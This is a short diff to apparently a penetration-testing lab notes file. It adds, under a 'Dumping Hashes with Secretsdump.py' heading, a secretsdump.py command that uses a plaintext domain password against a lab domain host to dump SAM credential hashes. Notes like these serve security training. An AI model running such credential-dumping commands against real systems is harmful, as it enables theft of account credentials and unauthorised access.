@@ -68,6 +68,8 @@ Then we can do `ls`
 
 ## **Dumping Hashes with Secretsdump.py**
 
-```shell
-# 
+```powershell
+# Dumping SAM hashes
+
+$ secretsdump.py MARVEL.local/fcastle:Password1@192.168.0.132
 ```
